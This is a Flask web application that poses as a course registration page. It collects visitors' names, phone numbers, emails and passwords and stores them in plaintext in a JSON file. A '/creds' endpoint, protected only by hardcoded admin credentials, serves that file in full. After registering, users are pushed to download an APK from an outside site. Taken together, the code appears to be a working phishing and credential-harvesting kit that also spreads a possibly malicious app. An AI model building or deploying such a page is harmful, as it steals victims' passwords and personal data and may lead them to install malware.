
from flask import Flask, render_template_string, request, redirect, session
import json
import os

app = Flask(__name__)
app.secret_key = 'super_secret_key'

if not os.path.exists("users.json"):
    with open("users.json", "w") as f:
        json.dump({}, f)

register_html = '''
<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
  <title>Course Registration</title>
  <style>
    body {
      margin: 0;
      font-family: 'Segoe UI', sans-serif;
      background-color: #0f0f0f;
      color: #f0f0f0;
      display: flex;
      justify-content: center;
      align-items: center;
      height: 100vh;
    }
    .form-container {
      background-color: #1a1a1a;
      padding: 30px;
      border-radius: 10px;
      box-shadow: 0 0 15px rgba(255, 0, 128, 0.3);
      max-width: 400px;
      width: 100%;
    }
    h2 {
      text-align: center;
      color: #00ff99;
    }
    label {
      display: block;
      margin: 15px 0 5px;
      font-weight: bold;
    }
    input {
      width: 100%;
      padding: 10px;
      border-radius: 5px;
      border: none;
      margin-bottom: 10px;
      background-color: #292929;
      color: white;
    }
    button {
      width: 100%;
      padding: 12px;
      border: none;
      background-color: #00ff99;
      color: black;
      font-weight: bold;
      font-size: 16px;
      border-radius: 5px;
      cursor: pointer;
    }
    .download-section {
      margin-top: 20px;
      text-align: center;
    }
    .download-section a {
      background: #ff00aa;
      color: white;
      padding: 10px 20px;
      border-radius: 5px;
      text-decoration: none;
    }
  </style>
</head>
<body>
  <form class="form-container" method="POST">
    <h2>Register to Access Course</h2>
    <label for="name">Full Name</label>
    <input type="text" name="name" required>

    <label for="phone">Phone Number</label>
    <input type="text" name="phone" required>

    <label for="email">Email</label>
    <input type="email" name="email" required>

    <label for="password">Password</label>
    <input type="password" name="password" required>

    <button type="submit">Register</button>

    {% if registered %}
    <div class="download-section">
      <p>Registration complete! Download the course app below:</p>
      <a href="https://factsworld.github.io/app.apk" download>Download App</a>
      <p style="margin-top: 10px;">Or <a href="https://factsworld.github.io/" style="color:#00ff99;">Open Website</a></p>
    </div>
    {% endif %}
  </form>
</body>
</html>
'''

@app.route("/", methods=["GET", "POST"])
def register():
    registered = False
    if request.method == "POST":
        data = {
            "name": request.form["name"],
            "phone": request.form["phone"],
            "email": request.form["email"],
            "password": request.form["password"]
        }
        with open("users.json", "r") as f:
            users = json.load(f)
        users[data["phone"]] = data
        with open("users.json", "w") as f:
            json.dump(users, f, indent=4)
        registered = True
    return render_template_string(register_html, registered=registered)

@app.route("/creds", methods=["GET"])
def creds():
    from flask import request, Response
    auth = request.authorization
    if not auth or auth.username != "admin" or auth.password != "adminpass":
        return Response("Unauthorized", 401, {"WWW-Authenticate": "Basic realm='Login Required'"})
    with open("users.json") as f:
        return f.read()

if __name__ == "__main__":
    app.run(host="0.0.0.0", port=80)
